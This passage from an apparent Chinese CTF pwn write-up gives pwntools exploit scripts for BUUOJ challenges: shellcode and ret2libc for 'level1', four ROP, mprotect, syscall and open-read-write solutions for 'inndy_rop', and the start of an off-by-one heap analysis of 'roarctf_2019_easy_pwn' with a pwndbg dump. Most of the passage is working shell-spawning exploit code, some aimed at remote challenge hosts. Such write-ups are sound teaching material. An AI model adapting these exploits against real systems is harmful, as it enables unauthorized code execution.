class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29905)</span></span><br><span class="line">buf_addr = <span class="built_in">int</span>(io.recv()[-<span class="number">12</span>:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload +=(<span class="number">0x88</span>+<span class="number">4</span>-<span class="built_in">len</span>(asm(shellcraft.sh())))*<span class="string">&#x27;a&#x27;</span> + p32(buf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(buf_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>只能ret2libc了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level1&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29905</span>)</span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">base = read - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(system_add) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x31-inndy-rop"><a href="#0x31-inndy-rop" class="headerlink" title="0x31.inndy_rop"></a>0x31.inndy_rop</h1><h2 id="解法一：ROP"><a href="#解法一：ROP" class="headerlink" title="解法一：ROP"></a>解法一：ROP</h2><p>静态编译，可以直接ropgadget找rop链：<code>ROPgadget --binary rop --ropchain</code></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="解法二：mprotect"><a href="#解法二：mprotect" class="headerlink" title="解法二：mprotect"></a>解法二：mprotect</h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./rop&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25843</span>)</span><br><span class="line">pop_3_ret = <span class="number">0x080483c8</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0xc</span>+<span class="number">4</span>) </span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]) </span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(elf.bss() &amp; <span class="number">0xffff000</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="解法三：syscall"><a href="#解法三：syscall" class="headerlink" title="解法三：syscall"></a>解法三：syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) </span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x80de769</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80b8016</span></span><br><span class="line">syscall = <span class="number">0x80627cd</span></span><br><span class="line">int_0x80 = <span class="number">0x806c943</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) </span><br><span class="line">payload += p32(pop_eax_ret) </span><br><span class="line">payload += p32(e.bss()) </span><br><span class="line">payload += p32(pop_eax_ret) </span><br><span class="line">payload += p32(<span class="number">11</span>) </span><br><span class="line">payload += p32(pop_ebx_pop_edx_ret) </span><br><span class="line">payload += p32(e.bss()) </span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(pop_ecx_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="解法四：orw"><a href="#解法四：orw" class="headerlink" title="解法四：orw"></a>解法四：orw</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) </span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p32(pop_ebx_pop_edx_ret)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop_esi_pop_ebx_pop_edx_ret) </span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(elf.bss()) </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) </span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload += p32(<span class="number">1</span>) </span><br><span class="line">payload += p32(elf.bss()) </span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x32-roarctf-2019-easy-pwn"><a href="#0x32-roarctf-2019-easy-pwn" class="headerlink" title="0x32.roarctf_2019_easy_pwn"></a>0x32.roarctf_2019_easy_pwn</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec roarctf_2019_easy_pwn </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/roarctf_2019_easy_pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开</p><p>分为create，write，drop和show</p><p>create:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_C46</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *malloc_addr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">15</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(&amp;unk_202040 + <span class="number">4</span> * index);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = INPUT(v2);</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">4096</span> )</span><br><span class="line">          size = <span class="number">4096</span>;</span><br><span class="line">        malloc_addr = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !malloc_addr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(&amp;unk_202040 + <span class="number">4</span> * index) = <span class="number">1</span>;         <span class="comment">// 置1表示已使用</span></span><br><span class="line">        *(&amp;unk_202044 + <span class="number">4</span> * index) = size;      <span class="comment">// 写入大小</span></span><br><span class="line">        qword_202048[<span class="number">2</span> * index] = malloc_addr;  <span class="comment">// 写入malloc的地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;the index of ticket is %d \n&quot;</span>, index);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_E82</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = INPUT(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(&amp;unk_202040 + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      v2 = INPUT(<span class="number">1</span>);</span><br><span class="line">      v4 = sub_E26(*(&amp;unk_202044 + <span class="number">4</span> * v3), v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        v2 = sub_D92(qword_202048[<span class="number">2</span> * v3], v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有off-by-one，当输入的size与原来的相差是10的时候，会加1。</p><p>delete：没有什么问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_F8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v0 = INPUT(v3);</span><br><span class="line">  v4 = v0;</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0LL</span> &amp;&amp; v0 &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;unk_202040 + <span class="number">4</span> * v0);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_202040 + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      *(&amp;unk_202044 + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(qword_202048[<span class="number">2</span> * v0]);</span><br><span class="line">      qword_202048[<span class="number">2</span> * v2] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先calloc几个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0,,这里calloc 0x58方便后面的写入</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/60gx 0x555555757000</span></span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757010:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757020:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570d0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557570e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757100:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000000</span><br><span 